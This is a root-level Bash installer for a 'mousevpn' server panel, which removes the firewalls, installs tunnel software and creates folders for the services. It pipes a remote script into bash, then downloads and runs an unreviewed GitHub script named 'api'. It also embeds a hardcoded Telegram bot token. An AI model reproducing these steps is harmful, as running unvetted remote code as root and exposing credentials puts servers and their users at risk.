#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
#mousevpn
clear
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1
sysctl -w net.ipv6.conf.default.disable_ipv6=1
    if [ "${EUID}" -ne 0 ]; then
		echo "You need to run this script as root"
		exit 1
    fi
    if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ is not supported"
		exit 1
    fi
ipvpslokal=$(hostname -I | cut -d\  -f1)
hostvps=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
    if [[ "${hostvps}" != "$dart" ]]; then
        echo "${ipvpslokal} $(hostname)" >> /etc/hosts
    fi
coreselect=''
cat> /root/.profile << END
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true
clear
END
chmod 644 /root/.profile
version=1.1
echo -e "$version" > /root/.version
echo -e "$version" > /opt/.ver
curl ipinfo.io/org | cut -d ' ' -f 2-10 > /root/.myisp
#curl ipinfo.io/org > /root/.myisp
curl ipinfo.io/city > /root/.mycity
curl ipinfo.io/ip > /root/.myip
curl ipinfo.io/org > /root/.isp
curl ipinfo.io/city > /root/.city
curl ifconfig.me > /root/.ip
curl ipinfo.io/region > /root/.region
function alatdebian(){
echo "ini vps debian"
OS=$ID # debian or ubuntu
#apt install -y nginx certbot
sleep 3s
sudo apt update -y
sudo apt upgrade -y
sudo apt dist-upgrade -y
update-grub
sudo apt-get remove --purge ufw firewalld -y
sudo apt-get remove --purge exim4 -y
apt install sysstat -y
apt -y install shc
apt install figlet -y
apt install ruby nload gawk htop bc iftop -y
apt install build-essential zlib1g-dev libpcre3 libpcre3-dev -y
apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential gcc make cmake -y
apt install xz-utils apt-transport-https gnupg gnupg2 gnupg1 dnsutils lsb-release -y
apt install socat cron bash-completion ntpdate -y
apt install software-properties-common -y
apt install certbot python python2 python3 python3-dnslib python3-pip -y
apt install iptables iptables-persistent -y
apt install libncurses5-dev libncursesw5-dev -y
apt install -y dos2unix debconf-utils dnsutils
apt install -y whois golang
apt install -y sudo net-tools gnutls-bin neofetch vnstat uuid
apt install -y pwgen php jq git curl wget
apt install -y mlocate dh-make libaudit-dev build-essential
apt install -y bzip2 gzip coreutils screen unzip
sudo apt install -y screen curl jq bzip2 gzip coreutils rsyslog iftop \
htop zip unzip net-tools sed gnupg gnupg1 \
bc sudo apt-transport-https build-essential dirmngr libxml-parser-perl neofetch screenfetch git lsof \
openssl openvpn easy-rsa fail2ban tmux \
stunnel4 vnstat squid3 \
dropbear  libsqlite3-dev \
socat cron bash-completion ntpdate xz-utils sudo apt-transport-https \
gnupg2 dnsutils lsb-release chrony
curl -sSL https://deb.nodesource.com/setup_16.x | bash -
sudo apt-get install nodejs -y
/etc/init.d/vnstat restart
wget -q https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc >/dev/null 2>&1 && make >/dev/null 2>&1 && make install >/dev/null 2>&1
cd
vnstat -u -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
rm -f /root/vnstat-2.6.tar.gz >/dev/null 2>&1
rm -rf /root/vnstat-2.6 >/dev/null 2>&1
sudo apt install -y libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev xl2tpd pptpd
clear
}
function alatubuntu() {
echo "ini vps Ubuntu"
OS=$ID # debian or ubuntu
#apt-get install -y nginx certbot
sleep 3s
apt-get update -y
apt-get upgrade -y
apt-get dist-upgrade -y
update-grub
apt-get install sysstat -y
apt-get -y install shc
apt-get install figlet -y
apt-get install ruby nload gawk htop bc iftop -y
apt-get install build-essential zlib1g-dev libpcre3 libpcre3-dev -y
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential gcc make cmake -y
apt-get install xz-utils apt-transport-https gnupg gnupg2 gnupg1 dnsutils lsb-release -y
apt-get install socat cron bash-completion ntpdate -y
apt-get install software-properties-common -y
apt-get install certbot python python2 python3 python3-dnslib python3-pip -y
apt-get install iptables iptables-persistent -y
apt-get install libncurses5-dev libncursesw5-dev -y
apt-get install -y dos2unix debconf-utils dnsutils
apt-get install -y whois golang
apt-get install -y sudo net-tools gnutls-bin neofetch vnstat uuid
apt-get install -y pwgen php jq git curl wget
apt-get install -y mlocate dh-make libaudit-dev build-essential
apt-get install -y bzip2 gzip coreutils screen unzip
sudo apt-get install -y screen curl jq bzip2 gzip coreutils rsyslog iftop \
htop zip unzip net-tools sed gnupg gnupg1 \
bc sudo apt-transport-https build-essential dirmngr libxml-parser-perl neofetch screenfetch git lsof \
openssl openvpn easy-rsa fail2ban tmux \
stunnel4 vnstat squid3 \
dropbear  libsqlite3-dev \
socat cron bash-completion ntpdate xz-utils sudo apt-transport-https \
gnupg2 dnsutils lsb-release chrony
curl -sSL https://deb.nodesource.com/setup_16.x | bash - 
sudo apt-get install nodejs -y
/etc/init.d/vnstat restart
wget -q https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc >/dev/null 2>&1 && make >/dev/null 2>&1 && make install >/dev/null 2>&1
cd
vnstat -u -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
rm -f /root/vnstat-2.6.tar.gz >/dev/null 2>&1
rm -rf /root/vnstat-2.6 >/dev/null 2>&1
sudo apt-get install -y libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev xl2tpd pptpd
clear
}
function SystemOperasi(){
source /etc/os-release
    if [ -f "/usr/bin/apt-get" ];then
            isDebian=`cat /etc/issue|grep Debian`
            if [ "$isDebian" != "" ];then
                    alatdebian
            else
                    alatubuntu
            fi
    else
        echo "ini vps Centos"
        OS=centos
        #yum install -y nginx certbot
        echo "ubah manual apt menjadi yum , contoh apt install squid menjadi yum install squid"
        echo "atau chat saya di telegram kalau kamu ga paham"
        echo "contact person t.me/Crystalllz"
        sleep 3s
        exit
    fi
}
function membuatfolder() {
mkdir -p /etc/mousevpntema
mkdir -p /etc/mousevpntema/tema
mkdir -p /var/lib/mousevpnip >/dev/null 2>&1
echo "IP=" >> /var/lib/mousevpn/ipvps.conf
mkdir -p /usr/bin/xray
mkdir -p /etc/xray
mkdir -p /etc/udp
mkdir -p /etc/dns
mkdir -p /etc/slowdns
touch /etc/xray/domain
touch /etc/xray/dns
touch /etc/xray/nsdomain
touch /etc/slowdns/server.pub
touch /etc/slowdns/server.key

rm -rf /etc/per > /dev/null 2>&1
mkdir -p /etc/per
touch /etc/per/id
touch /etc/per/token

mkdir -p /etc/mousevpnwuz
mkdir -p /etc/mousevpnwuz/limit
mkdir -p /etc/mousevpnwuz/limit/trojan
mkdir -p /etc/mousevpnwuz/limit/vless
mkdir -p /etc/mousevpnwuz/limit/vmess
mkdir -p /etc/mousevpnwuz/limit/shadowsocks
mkdir -p /etc/mousevpnwuz/limit/ssh
mkdir -p /etc/mousevpnwuz/limit/ssh/ip
mkdir -p /etc/mousevpnwuz/limit/trojan/ip
mkdir -p /etc/mousevpnwuz/limit/trojan/quota
mkdir -p /etc/mousevpnwuz/limit/vless/ip
mkdir -p /etc/mousevpnwuz/limit/vless/quota
mkdir -p /etc/mousevpnwuz/limit/vmess/ip
mkdir -p /etc/mousevpnwuz/limit/vmess/quota
mkdir -p /etc/mousevpnwuz/limit/shadowsocks/ip
mkdir -p /etc/mousevpnwuz/limit/shadowsocks/quota
mkdir -p /etc/mousevpnwuz/trojan
mkdir -p /etc/mousevpnwuz/vless
mkdir -p /etc/mousevpnwuz/vmess
mkdir -p /etc/mousevpnwuz/shadowsocks
mkdir -p /etc/mousevpnwuz/log
mkdir -p /etc/mousevpnwuz/log/trojan
mkdir -p /etc/mousevpnwuz/log/vless
mkdir -p /etc/mousevpnwuz/log/vmess
mkdir -p /etc/mousevpnwuz/log/shadowsocks
mkdir -p /etc/mousevpnwuz/log/ssh
mkdir -p /etc/mousevpnwuz/cache

mkdir -p /etc/mousevpnwuz/cache/trojan-tcp

mkdir -p /etc/mousevpnwuz/cache/trojan-ws
mkdir -p /etc/mousevpnwuz/cache/trojan-grpc
mkdir -p /etc/mousevpnwuz/cache/shadowsocks-ws
mkdir -p /etc/mousevpnwuz/cache/shadowsocks-grpc
mkdir -p /etc/mousevpnwuz/cache/vless-ws
mkdir -p /etc/mousevpnwuz/cache/vless-grpc
mkdir -p /etc/mousevpnwuz/cache/vmess-ws
mkdir -p /etc/mousevpnwuz/cache/vmess-grpc
mkdir -p /etc/mousevpnwuz/cache/vmess-ws-orbit
mkdir -p /etc/mousevpnwuz/cache/vmess-ws-orbit1
}

function fixtema(){
rm -rf /etc/mousevpntema/tema > /dev/null 2>&1
    if [ -f "/etc/mousevpntema/tema/blue" ]; then
        #echo "sudah ada tema, mulai proses over write"
        rm -rf /etc/mousevpntema/tema
        mkdir -p /etc/mousevpntema
        mkdir -p /etc/mousevpntema/tema
    else
        #echo "belum ada tema njuk create folder tema"
        mkdir -p /etc/mousevpntema
        mkdir -p /etc/mousevpntema/tema
    fi
#THEME RED
cat <<EOF>> /etc/mousevpntema/tema/red
BG : \E[40;1;41m
TEXT : \033[0;31m
EOF
#THEME BLUE
cat <<EOF>> /etc/mousevpntema/tema/blue
BG : \E[40;1;44m
TEXT : \033[0;34m
EOF
#THEME GREEN
cat <<EOF>> /etc/mousevpntema/tema/green
BG : \E[40;1;42m
TEXT : \033[0;32m
EOF
#THEME YELLOW
cat <<EOF>> /etc/mousevpntema/tema/yellow
BG : \E[40;1;43m
TEXT : \033[0;33m
EOF
#THEME MAGENTA
cat <<EOF>> /etc/mousevpntema/tema/magenta
BG : \E[40;1;43m
TEXT : \033[0;33m
EOF
#THEME CYAN
cat <<EOF>> /etc/mousevpntema/tema/cyan
BG : \E[40;1;46m
TEXT : \033[0;36m
EOF
#THEME CONFIG
cat <<EOF>> /etc/mousevpntema/tema/color.conf
blue
EOF
}
function iptabless(){
apt autoremove -y
wget https://github.com/busyloop/lolcat/archive/master.zip
unzip master.zip
rm -f master.zip
cd lolcat-master/bin
gem install lolcat
cd

rm –rf /usr/share/figlet > /dev/null 2>&1
rm –rf /root/figlet-fonts > /dev/null 2>&1
git clone https://github.com/xero/figlet-fonts
cd figlet-fonts
mv -f * /usr/share/figlet
cd /root
rm -rf figlet-fonts

iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
iptables -I INPUT -m state --state NEW -m udp -p udp --dport 80 -j ACCEPT
iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT
iptables -I INPUT -m state --state NEW -m udp -p udp --dport 443 -j ACCEPT
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload

cat> /etc/issue.net.txt << END
<br>
<font color="blue"><b>===============================</br></font><br>
<font color="red"><b>********  mousevpn  ********</b></font><br>
<font color="blue"><b>===============================</br></font><br>
END
}
function sendtele(){
wget https://raw.githubusercontent.com/Rerechan02/v/main/api
sed -i "s/Rerechan02/mousevpn/g" /root/api
sed -i "s/widyabakti02/njajaldoang/g" /root/api
chmod +x api
bash api
apt install python3-pip -y
pip3 install telegram-send
printf "6203209250:AAG7GoBbaUqo2qh4N-IGvScNisDWTHfLh8M" | telegram-send --configure
}
SystemOperasi
iptabless
sendtele
membuatfolder
fixtema
sleep 3
clear
